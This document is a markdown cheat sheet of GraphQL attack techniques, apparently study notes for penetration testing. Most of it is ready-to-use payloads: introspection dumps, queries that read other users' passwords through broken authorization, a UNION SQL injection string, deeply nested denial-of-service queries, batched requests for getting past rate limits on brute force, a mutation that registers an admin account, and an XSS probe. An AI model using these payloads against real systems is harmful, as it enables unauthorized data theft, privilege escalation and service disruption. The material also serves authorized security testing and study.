# GraphQL Attacks

## Common Endpoints

```
/graphql
/api/graphql
/graphql/console
/graphql.php
/graphiql
```

---

## Identification

### Fingerprint GraphQL Engine (graphw00f)

```bash
git clone https://github.com/dolevf/graphw00f.git
python3 main.py -d -f -t http://TARGET
```

### Security Audit (GraphQL-Cop)

```bash
git clone https://github.com/dolevf/graphql-cop.git
pip install -r requirements.txt
python3 graphql-cop.py -t http://TARGET/graphql
```

---

## Introspection Queries

### List All Types

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

### Get Fields of a Type

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

### List All Queries

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

### List All Mutations

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            kind
            name
          }
        }
      }
    }
  }
}
```

### Get Mutation Input Fields

```graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

### Full Introspection Dump (paste into GraphQL Voyager)

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }
```

---

## IDOR / Broken Authorization

### Identify

- Query returns user data based on username/id argument
- No session validation on query

### Exploit - Read Other User's Password

```graphql
{
  user(username: "admin") {
    username
    password
  }
}
```

### Exploit - Enumerate All Users

```graphql
{
  users {
    id
    username
    password
    role
  }
}
```

---

## SQL Injection

### Identify

- Send query without required argument → error reveals arg name
- Test argument with `'` → SQL syntax error = injectable

### Exploit - UNION SQLi in GraphQL

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

**Note:** Match number of columns to UserObject fields (use introspection to count)

---

## Denial of Service (DoS)

### Identify

- Look for circular references in schema (User → Posts → Author → Posts)
- Use GraphQL Voyager to visualize loops

### Exploit - Nested Query DoS

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      username
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Repeat nesting to crash server.

---

## Batching Attacks (Brute Force Bypass)

### Identify

- GraphQL-Cop reports "Array-based Query Batching" as HIGH
- GraphQL accepts JSON array of queries

### Exploit - Multiple Queries in Single Request

```http
POST /graphql HTTP/1.1
Content-Type: application/json

[
  {"query":"{user(username: \"admin\") {uuid}}"},
  {"query":"{user(username: \"test\") {uuid}}"},
  {"query":"{user(username: \"root\") {uuid}}"}
]
```

Bypass rate limits by sending 1000+ login attempts per request.

---

## Mutations - Privilege Escalation

### Identify

- Introspection reveals mutation with `role` input field
- No server-side validation of role value

### Exploit - Register Admin User

```bash
# Hash password first
echo -n 'password' | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99
```

```graphql
mutation {
  registerUser(input: {
    username: "hacker", 
    password: "5f4dcc3b5aa765d61d8327deb882cf99", 
    role: "admin", 
    msg: "pwned"
  }) {
    user {
      username
      role
    }
  }
}
```

---

## XSS via GraphQL

### Identify

- Error messages reflect input without encoding
- Send `<script>alert(1)</script>` as argument

### Test

```graphql
{
  post(id: "<script>alert(1)</script>") {
    title
  }
}
```

Check if error message reflects XSS payload unencoded.

---

## Tools

| Tool | Purpose | Install |
|------|---------|---------|
| graphw00f | Fingerprint GraphQL engine | `git clone https://github.com/dolevf/graphw00f` |
| GraphQL-Cop | Security audit | `git clone https://github.com/dolevf/graphql-cop` |
| GraphQL Voyager | Visualize schema | https://graphql-kit.com/graphql-voyager/ |
| InQL | Burp extension | BApp Store |

---

## Burp + InQL Workflow

1. Capture GraphQL request in Proxy
2. Right-click → Extensions → InQL → Generate queries
3. InQL tab shows all mutations/queries
4. Use GraphQL tab in Repeater for easy editing
